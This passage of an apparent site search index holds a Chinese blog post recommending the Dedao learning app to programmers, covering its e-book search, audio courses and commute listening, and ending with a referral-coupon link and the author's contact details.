\u4f46\u662f\uff0c\u7f51\u7edc\u4e0a\u672a\u7ecf\u6574\u7406\u7684\u5185\u5bb9\u8d28\u91cf\u5f80\u5f80\u53c2\u5dee\u4e0d\u9f50\uff0c\u9700\u8981\u82b1\u8d39\u4e0d\u5c11\u7684\u65f6\u95f4\u7cbe\u529b\u53bb\u7b5b\u9009\u3001\u7504\u522b\uff0c\u5e76\u4e14\u5230\u6700\u540e\u53ef\u80fd\u8fd8\u662f\u627e\u4e0d\u5230\u4e00\u4e2a\u8ba9\u6211\u4eec\u6ee1\u610f\u7684\u7b54\u6848\u3002 \u4f46\u4e66\u7c4d\u91cc\u7684\u5185\u5bb9\u5c31\u4e0d\u4e00\u6837\u4e86\uff0c\u7ecf\u8fc7\u4f5c\u8005\u7684\u68b3\u7406\u548c\u51fa\u7248\u793e\u7f16\u8f91\u7684\u7b5b\u9009\uff0c\u91cc\u9762\u7684\u77e5\u8bc6\u5df2\u7ecf\u975e\u5e38\u7cfb\u7edf\u5316\uff0c\u5e76\u4e14\u662f\u66f4\u52a0\u53ef\u4fe1\u7684\u3002 \u6240\u4ee5\uff0c\u5728\u6211\u60f3\u8981\u5b66\u4e60\u4e00\u4e2a\u65b0\u6982\u5ff5\u7684\u65f6\u5019\uff0c\u6211\u4f1a\u9996\u5148\u9009\u62e9\u4ece\u5f97\u5230\u7684\u641c\u7d22\u5f15\u64ce\u8fdb\u884c\u641c\u7d22\u3002 \u6bd4\u5982\uff0c\u5728\u5199 \u300auC/OS\u7684\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u4e3a\u4ec0\u4e48\u80fd\u63d0\u9ad8\u6548\u7387\u300b \u8fd9\u7bc7\u7b14\u8bb0\u7684\u65f6\u5019\uff0c\u901a\u8fc7\u7f51\u7edc\u641c\u7d22 \u5ef6\u8fdf\u4e2d\u65ad \u8fd9\u4e2a\u5173\u952e\u8bcd\uff0c\u51fa\u6765\u7684\u6587\u7ae0\u975e\u5e38\u5c11\uff0c\u5e76\u4e14\u6211\u611f\u89c9\u6ca1\u6709\u8bb2\u5f97\u975e\u5e38\u6e05\u695a\u3002\u800c\u4e0b\u9762\u662f\u6211\u5728\u5f97\u5230\u7684\u641c\u7d22\u5f15\u64ce\u4e2d\u8fdb\u884c\u641c\u7d22\u65f6\u7684\u7ed3\u679c\u3002 \\text{Figure 1. \u5ef6\u8fdf\u4e2d\u65ad\u641c\u7d22} \\text{Figure 2. \u5ef6\u8fdf\u4e2d\u65ad\u5185\u5bb9} \u641c\u7d22\u5b8c\u4ee5\u540e\uff0c\u6211\u5c31\u80fd\u76f4\u63a5\u901a\u8fc7\u770b \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u8fdb\u884c\u5b66\u4e60\u4e86\u3002 \u518d\u4e3e\u4f8b\u6765\u8bf4\uff0c\u6211\u5728\u770b \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u65f6\uff0c\u6709\u4e00\u4e2a\u4f18\u5148\u7ea7\u53cd\u8f6c\u7684\u95ee\u9898\u4e0d\u662f\u5f88\u6e05\u695a\uff0c\u6211\u53c8\u5728\u5f97\u5230\u91cc\u9762\u8fdb\u884c\u4e86\u641c\u7d22\uff0c\u7ed3\u679c\u5982\u4e0b\u3002 \\text{Figure 3. \u4f18\u5148\u7ea7\u53cd\u8f6c\u641c\u7d22} \\text{Figure 4. \u4f18\u5148\u7ea7\u53cd\u8f6c\u5185\u5bb9} \u6211\u901a\u8fc7\u5218\u65ed\u660e\u8001\u5e08\u5199\u7684 \u300a\u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u539f\u7406\u4e0e\u6700\u4f73\u5b9e\u8df5\u300b \u8fd9\u672c\u4e66\u53c8\u5bf9\u4f18\u5148\u7ea7\u53cd\u8f6c\u3001\u4f18\u5148\u7ea7\u7ee7\u627f\u7b56\u7565\u548c\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565\u8fdb\u884c\u4e86\u5b66\u4e60\uff0c\u5e76\u4e14\u6458\u5f55\u4e86\u4e00\u90e8\u5206\u5185\u5bb9\u5728 \u300a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u4f18\u5148\u7ea7\u53cd\u8f6c\u4e0e\u4e2d\u65ad\u673a\u5236\u300b \u8fd9\u7bc7\u7b14\u8bb0\u4e2d\u3002 \u9664\u4e86\u5229\u7528\u5f97\u5230\u7684\u641c\u7d22\u5f15\u64ce\u4ee5\u5916\uff0c\u76f4\u63a5\u5728\u5f97\u5230\u91cc\u770b\u7535\u5b50\u4e66\u7684\u4f53\u9a8c\u4e5f\u975e\u5e38\u597d\uff0c\u800c\u4e14\u80fd\u5728iPad\u548c\u624b\u673a\u4e0a\u8fdb\u884c\u9605\u8bfb\u5e76\u6dfb\u52a0\u7b14\u8bb0\u3001\u4e66\u7b7e\uff0c\u518d\u4e5f\u4e0d\u7528\u62ff\u51fa\u597d\u51e0\u65a4\u91cd\u7684\u4e66\u51fa\u6765\u7ffb\u4e86\u3002 \u6211\u4e4b\u524d\u4e00\u53e3\u6c14\u52a0\u4e86\u5feb300\u672c\u7535\u5b50\u4e66\u5728\u4e66\u67b6\u4e0a\uff0c\u4e5f\u4e0d\u77e5\u9053\u5565\u65f6\u5019\u80fd\u770b\u5b8c\uff0c\u54c8\u54c8\u3002 \\text{Figure 5. \u4e66\u67b6} \u603b\u4e4b\uff0c \u5f97\u5230\u7684\u77e5\u8bc6\u641c\u7d22\u5f15\u64ce \u80fd\u591f\u7ed9\u6211\u4eec\u7684\u5b66\u4e60\u5e26\u6765\u5f88\u5927\u7684\u4fbf\u5229\uff0c\u7701\u65f6\u9ad8\u6548\u8fd8\u4e0d\u8d35\u3002 3. \u5bf9\u77e5\u8bc6\u9762\u8fdb\u884c\u6269\u5145 # \u5982\u679c\u5f97\u5230\u7684\u77e5\u8bc6\u641c\u7d22\u5f15\u64ce\u8fd8\u4e0d\u591f\u5438\u5f15\u4f60\uff0c\u90a3\u4e48\u6211\u6765\u4e3a\u4f60\u4ecb\u7ecd\u7b2c\u4e8c\u4e2a\u63a8\u8350\u7406\u7531\uff1a\u5bf9\u77e5\u8bc6\u9762\u8fdb\u884c\u6269\u5145\u3002 \u5f97\u5230\u4e0a\u9664\u4e86\u6709\u7535\u5b50\u4e66\u4ee5\u5916\uff0c\u8fd8\u6709\u4e0a\u767e\u95e8\u8bfe\u7a0b\u548c\u5bf9\u4e0a\u5343\u672c\u4e66\u7684\u97f3\u9891\u89e3\u8bfb\uff0c\u5185\u5bb9\u6db5\u76d6 \u7ecf\u6d4e\u5b66 \u3001 \u91d1\u878d\u5b66 \u3001 \u5fc3\u7406\u5b66 \u3001 \u5386\u53f2\u5b66 \u548c \u533b\u5b66 \u7b49\u7b49\u5404\u65b9\u9762\u5185\u5bb9\uff0c\u751a\u81f3\u8fd8\u6709\u6559\u4f60 \u600e\u4e48\u4fdd\u62a4\u9888\u690e \u3001 \u600e\u4e48\u83b7\u5f97\u804c\u573a\u7ade\u4e89\u529b \u3001 \u600e\u4e48\u5904\u7406\u804c\u573a\u5173\u7cfb \u3001 \u600e\u4e48\u505a\u597d\u4e00\u4e2a\u4ea7\u54c1 \u3001 \u600e\u4e48\u83b7\u5f97\u7528\u6237\u589e\u957f \u7b49\u7b49\u8bfe\u7a0b\uff0c\u6bcf\u95e8\u8bfe\u7a0b\u4ef7\u683c\u572820-200\u5143\u5de6\u53f3\uff0c20\u5143\u7684\u8bfe\u5927\u6982\u670910\u8282\u7684\u5185\u5bb9\uff0c100\u5143\u7684\u8bfe\u5927\u698230-50\u8282\uff0c200\u5143\u7684\u8bfe\u5c31\u90fd\u662f\u5168\u5e74\u7684\u4e86\uff0c200-300\u8282\u7684\u6837\u5b50\uff0c\u80fd\u591f\u5e2e\u4f60\u7cfb\u7edf\u5730\u4e86\u89e3\u4e00\u4e2a\u9886\u57df\u5185\u7684\u77e5\u8bc6\u3002 \u5728\u5f97\u5230\u91cc\u6700\u53d7\u7a0b\u5e8f\u5458\u670b\u53cb\u6b22\u8fce\u7684\u5e94\u8be5\u5c31\u662f \u5434\u519b\u8001\u5e08 \u4e86\uff0c\u4ed6\u662f\u8c37\u6b4c\u4e2d\u65e5\u97e9\u641c\u7d22\u5f15\u64ce\u7684\u4e3b\u8981\u8bbe\u8ba1\u8005\u3002\u5f88\u591a\u540c\u5b66\u5e94\u8be5\u542c\u8bf4\u8fc7\u5434\u519b\u8001\u5e08\u5199\u7684\u300a\u6570\u5b66\u4e4b\u7f8e\u300b\u3001 \u300a\u6d6a\u6f6e\u4e4b\u5dc5\u300b \u548c\u300a\u7845\u8c37\u4e4b\u8c1c\u300b\u3002 \u5434\u519b\u8001\u5e08\u5728\u5f97\u5230\u91cc\u8bb2 5G \u3001\u8bb2 \u4fe1\u606f\u8bba \u3001\u8bb2 \u6570\u5b66\u601d\u7ef4 \u3001\u8bb2 \u4ed6\u5728\u7845\u8c37\u505a\u6295\u8d44\u4eba\u7684\u7ecf\u9a8c \uff0c\u6536\u83b7\u4e86\u4e00\u4f17\u597d\u8bc4\u3002 \u5f97\u5230\u4e0a\u50cf\u5434\u519b\u8001\u5e08\u8fd9\u6837\u7684\u5e7f\u53d7\u597d\u8bc4\u7684\u8001\u5e08\u8fd8\u6709\u5f88\u591a\uff0c\u6211\u611f\u89c9\u80fd\u8ddf\u7740\u8fd9\u6837\u7684\u8001\u5e08\u5b66\u4e60\uff0c\u4e0d\u5149\u80fd\u591f\u6269\u5c55\u89c6\u91ce\u3001\u953b\u70bc\u601d\u7ef4\uff0c\u800c\u4e14\u8fd8\u80fd\u591f\u8ba9\u6211\u4eec\u77ed\u6682\u5730\u4ece\u73b0\u5b9e\u4e2d\u62bd\u79bb\u51fa\u6765\uff0c\u4e86\u89e3\u5916\u9762\u7684\u4e16\u754c\uff0c \u53cd\u601d\u81ea\u5df1\u7684\u751f\u6d3b \u3002\u518d\u8bf4\u4e86\uff0c\u901a\u8fc7\u8fd9\u6837\u6bd4\u8f83\u8f7b\u677e\u7684\u65b9\u5f0f\u4e86\u89e3\u6765\u81ea\u4e0d\u540c\u884c\u4e1a\u7684\u5404\u79cd\u5404\u6837\u7684\u77e5\u8bc6\uff0c \u672c\u8eab\u4e5f\u662f\u4e00\u79cd\u4eab\u53d7 \u3002 4. \u5bf9\u788e\u7247\u65f6\u95f4\u8fdb\u884c\u5229\u7528 # \u7b2c\u4e09\u4e2a\u63a8\u8350\u7406\u7531\u662f\uff1a \u5bf9\u788e\u7247\u65f6\u95f4\u8fdb\u884c\u5229\u7528 \u3002 \u5f97\u5230\u7684\u8bfe\u7a0b\u6709\u4e00\u4e2a\u7279\u70b9\uff0c\u91cc\u9762\u90fd\u662f\u4e13\u4e1a\u7684\u914d\u97f3\u8001\u5e08\u6765\u5f55\u5236\u7684 \u97f3\u9891\u8bfe \uff0c\u5e76\u4e14\u4e5f\u914d\u6709\u6587\u7a3f\u3002\u53ef\u4ee5\u968f\u65f6\u968f\u5730\u6234\u8d77\u8033\u673a\u542c\u8bfe\uff0c\u6ca1\u6709\u7406\u89e3\u7684\u5730\u65b9\u53ef\u4ee5\u770b\u770b\u6587\u7a3f\u3001\u770b\u770b\u91cc\u9762\u7684\u601d\u7ef4\u5bfc\u56fe\u3001\u5176\u4ed6\u540c\u5b66\u7684\u8bc4\u8bba\u8fd8\u6709\u8001\u5e08\u7684\u89e3\u7b54\u3002 \u6211\u662f\u57282018\u5e74\u6691\u5047\u5f00\u59cb\u4f7f\u7528\u5f97\u5230\u7684\uff0c\u90a3\u65f6\u5019\u6211\u4ece\u7f57\u632f\u5b87\u7684 \u300a\u77e5\u8bc6\u5c31\u662f\u529b\u91cf\u300b \u8282\u76ee\u91cc\u9762\u4e86\u89e3\u5230\u4e86\u5f97\u5230\uff0c\u4e8e\u662f\u5c31\u4e0b\u8f7d\u4e0b\u6765\u5c1d\u8bd5\u4e86\u4e00\u4e0b\uff0c\u7ed3\u679c\u975e\u5e38\u5951\u5408\u6211\u5f53\u65f6\u7684\u9700\u8981\u3002 \u56e0\u4e3a\u6211\u5f53\u65f6\u6691\u5047\u7559\u5728\u5b66\u6821\u5b9e\u4e60\uff0c\u6bcf\u5929\u8981\u5750\u4e00\u4e24\u4e2a\u5c0f\u65f6\u7684\u516c\u4ea4\u6216\u8005\u5730\u94c1\u53bb\u516c\u53f8\uff0c\u6bcf\u5929 \u901a\u52e4 \u7684\u65f6\u95f4\u7ecf\u5e38\u8fd8\u6ca1\u6709\u5ea7\u4f4d\uff0c\u7ad9\u5728\u8f66\u4e0a\u770b\u624b\u673a\u4e5f\u4e0d\u65b9\u4fbf\uff0c\u542c\u97f3\u4e50\u542c\u4e45\u4e86\u4e5f\u6bd4\u8f83\u70e6\u8e81\u3002\u800c\u8fd9\u4e2a\u65f6\u5019\u542c\u4e00\u542c\u5f97\u5230\u91cc\u7684\u97f3\u9891\u8bfe\u5c31\u975e\u5e38\u9002\u5408\u3002\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u4e5f\u5f88\u6709\u8da3\uff0c\u4e0d\u4f1a\u5f88\u67af\u71e5\uff0c\u542c\u8d77\u6765\u4e0d\u4f1a\u7279\u522b\u7d2f\u3002\u6211\u4e00\u4e0b\u5c31\u6210\u4e3a\u4e86\u5f97\u5230\u7684\u5fe0\u5b9e\u7528\u6237\u3002 \u5728\u5b9e\u4e60\u7ed3\u675f\u4ee5\u540e\uff0c\u6211\u53c8\u517b\u6210\u4e86\u6bcf\u5929\u5403\u5b8c\u665a\u996d\u4ee5\u540e\u8fd8\u6709\u7761\u89c9\u4ee5\u524d\u5404\u542c\u534a\u5c0f\u65f6\u5230\u4e00\u5c0f\u65f6\u8bfe\u7684\u4e60\u60ef\u3002\u5230\u73b0\u5728\uff0c \u6211\u5df2\u7ecf\u4f7f\u7528\u4e86\u5f97\u5230607\u5929\u3001\u5b66\u4e60\u4e861207.1\u5c0f\u65f6 \u3002\u4f7f\u7528\u4e86\u5f97\u5230\u8fd9\u4e48\u957f\u65f6\u95f4\uff0c\u6211\u4eec\u5148\u4e0d\u8bf4\u5b83\u5e26\u6765\u7684\u4e00\u4e9b\u601d\u7ef4\u65b9\u9762\u7684\u6539\u53d8\uff0c\u6211\u5149\u662f \u548c\u670b\u53cb\u804a\u5929\u7684\u8c08\u8d44\u5c31\u591a\u4e86\u4e0d\u5c11 \u3002\u5728\u8ba8\u8bba\u4e00\u4e2a\u95ee\u9898\u7684\u9002\u5408\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\u542c\u8fc7\u7684\u8bfe\u7a0b\u53bb\u8fdb\u884c\u4e0d\u540c\u89d2\u5ea6\u7684\u601d\u8003\uff0c\u8fd8\u80fd \u968f\u65f6\u5f15\u7528\u8001\u5e08\u8bb2\u8fc7\u7684\u5185\u5bb9 \uff0c\u51cf\u5c11\u4e00\u4e9b\u56e0\u4e3a\u6ca1\u6709\u8bdd\u9898\u800c\u5bfc\u81f4\u7684\u5c2c\u804a\u3002 5. \u5f97\u5230\u662f\u5728\u8d29\u5356\u7126\u8651\u5417 # \u5f88\u591a\u4eba\u8bf4\u7f57\u632f\u5b87\u5728\u8d29\u5356\u7126\u8651\uff0c\u4e5f\u6709\u4eba\u8bf4\u6216\u6574\u4e2a\u77e5\u8bc6\u4ed8\u8d39\u9886\u57df\u90fd\u662f\u5728\u8d29\u5356\u7126\u8651\u3001\u5272\u97ed\u83dc\u3002\u674e\u8bde\u8fd8\u5728\u5947\u8469\u8bf4\u7b2c\u516d\u5b63\u7b2c\u4e00\u671f\u8bf4\u7f57\u632f\u5b87\u662f\u201c\u641e\u4f20\u9500\u7684\u201c\u3002 \\text{Figure 6. \u5947\u8469\u8bf4\u7b2c\u516d\u5b63\u7b2c\u4e00\u671f} \u4f46\u5176\u5b9e\u6211\u89c9\u5f97\uff0c\u4ec0\u4e48\u53eb\u505a\u8d29\u5356\u7126\u8651\uff0c\u6211\u53ef\u4ee5\u5c1d\u8bd5\u7740\u7ed9\u4ed6\u4e0b\u4e00\u4e2a\u5b9a\u4e49\uff1a \u544a\u8bc9\u4f60\u522b\u4eba\u6709\u5149\u660e\u4f1f\u5927\u7684\u524d\u7a0b\uff0c\u4e0e\u4f60\u7684\u8747\u8425\u72d7\u82df\u5f62\u6210\u9c9c\u660e\u7684\u5bf9\u7167\u3002 \u7ed9\u4f60\u704c\u8f93\u4e00\u4e9b\u770b\u4f3c\u6b63\u786e\u7684\u62bd\u8c61\u6210\u529f\u5b66\uff0c\u544a\u8bc9\u4f60\u5982\u679c\u505a\u4e0d\u5230\u8fd9\u4e00\u70b9\uff0c\u4f60\u79bb\u6210\u529f\u5c31\u8d8a\u6765\u8d8a\u8fdc\u3002 \u6bd4\u5982\u4ec0\u4e48\u300a\u6210\u529f\u4eba\u58eb\u5fc5\u5907\u7684\u4e24\u4e2a\u4e60\u60ef\u300b\uff0c\u300a\u4ed6\u5982\u4f55\u8f7b\u8f7b\u677e\u677e\u5e74\u5165\u767e\u4e07\u300b\uff0c\u7ed3\u679c\u70b9\u8fdb\u53bb\u4e00\u770b\u544a\u8bc9\u4f60\u4e00\u8981\u81ea\u5f8b\u4e8c\u8981\u52aa\u529b\u3002\u8fd9\u79cd\u6587\u7ae0\u7eaf\u7cb9\u5c31\u662f\u4e3a\u4e86\u8ba9\u4f60\u70b9\u8fdb\u53bb\u8d5a\u4e00\u70b9\u5e7f\u544a\u6d41\u91cf\u3002 \u800c\u5f97\u5230\u4e0d\u540c\uff0c\u5c31\u50cf\u7f57\u632f\u5b87\u57282020\u5e74\u8de8\u5e74\u6f14\u8bb2\u4e0a\u6240\u8bf4\u7684\uff0c\u6211\u4eec\u90fd\u662f \u505a\u4e8b\u7684\u4eba \uff0c\u8981\u89e3\u51b3\u7684\u662f \u5177\u4f53\u7684\u95ee\u9898 \u3002\u8001\u5e08\u4eec\u5e26\u4f60\u62bd\u8c61\u51fa\u4e00\u4e2a\u4e2a\u9886\u57df\u6a21\u578b\u4ee5\u540e\uff0c\u53c8\u4f1a\u5e26\u4f60\u56de\u5230\u73b0\u5b9e\uff0c\u544a\u8bc9\u4f60\u600e\u4e48\u7528\u5b83\u6765\u6307\u5bfc\u751f\u6d3b\u3002\u6700\u8fd1\u5f97\u5230\u8fd8\u4e0a\u7ebf\u4e86\u201c\u5341\u4e07\u4e2a\u600e\u4e48\u529e\u201d\u77e5\u8bc6\u5de5\u7a0b\uff0c\u7531\u5404\u884c\u4e1a\u7684\u8d44\u6df1\u4eba\u58eb\u4eec\u6765\u89e3\u7b54\u7528\u6237\u4eec\u4e00\u4e2a\u4e2a\u5177\u4f53\u7684\u95ee\u9898\u3002 \u6211\u89c9\u5f97\u8fd9\u4e0d\u662f\u8d29\u5356\u7126\u8651\u7684\u6001\u5ea6\uff0c\u8fd9\u662f\u7684\u7684\u786e\u786e\u5728\u505a\u77e5\u8bc6\u670d\u52a1\u7684\u6001\u5ea6\u3002 \u597d\u4e86\uff0c\u6211\u7684\u5b89\u5229\u5df2\u7ecf\u5b8c\u6210\u4e86\u3002\u5982\u679c\u540c\u5b66\u4eec\u611f\u5174\u8da3\u53ef\u4ee5\u4ece\u5e94\u7528\u5546\u5e97\u4e0b\u8f7d\u5f97\u5230\u8bd5\u7528\u4e00\u4e0b\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 \u6211\u5206\u4eab\u7684\u94fe\u63a5 \u6ce8\u518c\uff0c\u80fd\u591f \u989d\u5916\u83b7\u5f9720\u5143\u4f18\u60e0\u5238 \u3002 \\text{Figure 7. \u9080\u8bf7\u7801} \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u6211\u4e3a\u4ec0\u4e48\u63a8\u8350\u7a0b\u5e8f\u5458\u670b\u53cb\u4f7f\u7528\u5f97\u5230APP"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E5%BE%97%E5%88%B0APP/1.%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8E%A8%E8%8D%90%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%8B%E5%8F%8B%E4%BD%BF%E7%94%A8%E5%BE%97%E5%88%B0APP/#app","text":"","title":"\u6211\u4e3a\u4ec0\u4e48\u63a8\u8350\u7a0b\u5e8f\u5458\u670b\u53cb\u4f7f\u7528\u5f97\u5230APP"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E5%BE%97%E5%88%B0APP/1.%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8E%A8%E8%8D%90%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%8B%E5%8F%8B%E4%BD%BF%E7%94%A8%E5%BE%97%E5%88%B0APP/#_1","text":"\u6211\u4e3a\u4ec0\u4e48\u63a8\u8350\u7a0b\u5e8f\u5458\u670b\u53cb\u4f7f\u7528\u5f97\u5230APP \u76ee\u5f55 1. \u80cc\u666f 2. \u5bf9\u6280\u672f\u4e66\u7c4d\u5185\u5bb9\u8fdb\u884c\u641c\u7d22 3. \u5bf9\u77e5\u8bc6\u9762\u8fdb\u884c\u6269\u5145 4. \u5bf9\u788e\u7247\u65f6\u95f4\u8fdb\u884c\u5229\u7528 5. \u5f97\u5230\u662f\u5728\u8d29\u5356\u7126\u8651\u5417","title":"\u76ee\u5f55"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E5%BE%97%E5%88%B0APP/1.%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8E%A8%E8%8D%90%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%8B%E5%8F%8B%E4%BD%BF%E7%94%A8%E5%BE%97%E5%88%B0APP/#1","text":"\u524d\u6bb5\u65f6\u95f4\u6211\u5199\u4e86 \u51e0\u7bc7\u7b14\u8bb0 \uff0c\u6587\u4e2d\u63d0\u5230\u4e86\u5f97\u5230APP\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u91cc\u9762\u9644\u4e0a\u4e86\u6211\u4ece\u5f97\u5230APP\u91cc\u5206\u4eab\u51fa\u6765\u7684\u7535\u5b50\u4e66\u94fe\u63a5\u3002\u800c\u8ba9\u6211\u60ca\u5947\u7684\u662f\uff0c\u6709\u540c\u5b66\u901a\u8fc7 \u6211\u7684\u94fe\u63a5 \u6ce8\u518c\u4e86\u5f97\u5230\u3002 \u4e8e\u662f\uff0c\u6211\u5c31\u840c\u751f\u4e86\u5199\u4e00\u7bc7\u7b14\u8bb0\u6765\u63a8\u8350\u5f97\u5230APP\u7ed9\u7a0b\u5e8f\u5458\u670b\u53cb\u4eec\u7684\u60f3\u6cd5\u3002 \u6211\u63a8\u8350\u7684\u7406\u7531\u4e3b\u8981\u6709\u5982\u4e0b\u4e09\u70b9\uff1a \u4f7f\u7528\u5f97\u5230APP\u80fd\u591f\u5bf9\u6280\u672f\u4e66\u7c4d\u5185\u5bb9\u8fdb\u884c\u641c\u7d22 \u80fd\u591f\u5bf9\u77e5\u8bc6\u9762\u8fdb\u884c\u6269\u5145 \u5bf9\u788e\u7247\u65f6\u95f4\u8fdb\u884c\u5229\u7528 \u4e0b\u9762\u6211\u4eec\u5c31\u4e00\u4e00\u9053\u6765\u3002","title":"1. \u80cc\u666f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E5%BE%97%E5%88%B0APP/1.%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8E%A8%E8%8D%90%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%8B%E5%8F%8B%E4%BD%BF%E7%94%A8%E5%BE%97%E5%88%B0APP/#2","text":"\u7b2c\u4e00\u4e2a\u7406\u7531\u662f\uff1a\u4f7f\u7528\u5f97\u5230APP\u80fd\u591f\u5bf9\u6280\u672f\u4e66\u7c4d\u5185\u5bb9\u8fdb\u884c\u641c\u7d22\u3002 \u8fd9\u662f\u8ba9\u6211\u6700\u559c\u6b22\u7684\u4e00\u4e2a\u529f\u80fd\uff0c \u5f97\u5230APP\u91cc\u6709\u4e0a\u4e07\u672c\u7535\u5b50\u4e66 \uff0c\u6211\u4eec\u6bd4\u8f83\u719f\u6089\u7684\u4eba\u6c11\u90ae\u7535\u51fa\u7248\u793e\u300a\u56fe\u7075\u7cfb\u5217\u4e1b\u4e66\u300b\uff0c\u5728\u5f97\u5230\u91cc\u51e0\u4e4e\u90fd\u6709\u7535\u5b50\u7248\uff0c\u800c\u4e14\u53ef\u4ee5\u514d\u8d39\u6d4f\u89c8\u4efb\u610f 10\\% \u7684\u5185\u5bb9\uff0c\u5982\u679c\u82b1100\u591a\u5f00\u901a\u4e00\u5e74\u7535\u5b50\u4e66\u4f1a\u5458\u66f4\u662f \u57fa\u672c\u90fd\u80fd\u514d\u8d39\u770b \u3002 \u5e76\u4e14\uff0c\u5f97\u5230\u5efa\u7acb\u4e86\u4e00\u4e2a \u77e5\u8bc6\u641c\u7d22\u5f15\u64ce \uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5bf9\u5f97\u5230APP\u5185\u7684\u8bfe\u7a0b\u5185\u5bb9\u3001\u7535\u5b50\u4e66\u5185\u5bb9\u3001\u6587\u7ae0\u5185\u5bb9\u8fdb\u884c\u641c\u7d22\u3002 \u5bf9\u6211\u4eec\u6700\u5177\u5438\u5f15\u529b\u7684\u5f53\u7136\u662f \u5bf9\u6280\u672f\u4e66\u7c4d\u8fdb\u884c\u641c\u7d22 \u4e86\uff0c\u5728\u6211\u4eec\u9700\u8981\u4e86\u89e3\u4e00\u4e2a\u65b0\u6982\u5ff5\uff0c\u6216\u8005\u89e3\u51b3\u4e00\u4e2a\u65b0\u95ee\u9898\u7684\u65f6\u5019\uff0c\u901a\u5e38\u9700\u8981\u501f\u52a9\u641c\u7d22\u5f15\u64ce\u3002\u6211\u4eec\u53ef\u80fd\u5728CSDN\u4e0a\u627e\u4e00\u627e\u535a\u5ba2\u3001\u5728\u77e5\u4e4e\u4e0a\u641c\u7d22\u4e00\u4e0b\u95ee\u7b54\u3002 \u4f46\u662f\uff0c\u7f51\u7edc\u4e0a\u672a\u7ecf\u6574\u7406\u7684\u5185\u5bb9\u8d28\u91cf\u5f80\u5f80\u53c2\u5dee\u4e0d\u9f50\uff0c\u9700\u8981\u82b1\u8d39\u4e0d\u5c11\u7684\u65f6\u95f4\u7cbe\u529b\u53bb\u7b5b\u9009\u3001\u7504\u522b\uff0c\u5e76\u4e14\u5230\u6700\u540e\u53ef\u80fd\u8fd8\u662f\u627e\u4e0d\u5230\u4e00\u4e2a\u8ba9\u6211\u4eec\u6ee1\u610f\u7684\u7b54\u6848\u3002 \u4f46\u4e66\u7c4d\u91cc\u7684\u5185\u5bb9\u5c31\u4e0d\u4e00\u6837\u4e86\uff0c\u7ecf\u8fc7\u4f5c\u8005\u7684\u68b3\u7406\u548c\u51fa\u7248\u793e\u7f16\u8f91\u7684\u7b5b\u9009\uff0c\u91cc\u9762\u7684\u77e5\u8bc6\u5df2\u7ecf\u975e\u5e38\u7cfb\u7edf\u5316\uff0c\u5e76\u4e14\u662f\u66f4\u52a0\u53ef\u4fe1\u7684\u3002 \u6240\u4ee5\uff0c\u5728\u6211\u60f3\u8981\u5b66\u4e60\u4e00\u4e2a\u65b0\u6982\u5ff5\u7684\u65f6\u5019\uff0c\u6211\u4f1a\u9996\u5148\u9009\u62e9\u4ece\u5f97\u5230\u7684\u641c\u7d22\u5f15\u64ce\u8fdb\u884c\u641c\u7d22\u3002 \u6bd4\u5982\uff0c\u5728\u5199 \u300auC/OS\u7684\u5ef6\u8fdf\u4e2d\u65ad\u63d0\u4ea4\u4e3a\u4ec0\u4e48\u80fd\u63d0\u9ad8\u6548\u7387\u300b \u8fd9\u7bc7\u7b14\u8bb0\u7684\u65f6\u5019\uff0c\u901a\u8fc7\u7f51\u7edc\u641c\u7d22 \u5ef6\u8fdf\u4e2d\u65ad \u8fd9\u4e2a\u5173\u952e\u8bcd\uff0c\u51fa\u6765\u7684\u6587\u7ae0\u975e\u5e38\u5c11\uff0c\u5e76\u4e14\u6211\u611f\u89c9\u6ca1\u6709\u8bb2\u5f97\u975e\u5e38\u6e05\u695a\u3002\u800c\u4e0b\u9762\u662f\u6211\u5728\u5f97\u5230\u7684\u641c\u7d22\u5f15\u64ce\u4e2d\u8fdb\u884c\u641c\u7d22\u65f6\u7684\u7ed3\u679c\u3002 \\text{Figure 1. \u5ef6\u8fdf\u4e2d\u65ad\u641c\u7d22} \\text{Figure 2. \u5ef6\u8fdf\u4e2d\u65ad\u5185\u5bb9} \u641c\u7d22\u5b8c\u4ee5\u540e\uff0c\u6211\u5c31\u80fd\u76f4\u63a5\u901a\u8fc7\u770b \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u8fdb\u884c\u5b66\u4e60\u4e86\u3002 \u518d\u4e3e\u4f8b\u6765\u8bf4\uff0c\u6211\u5728\u770b \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b 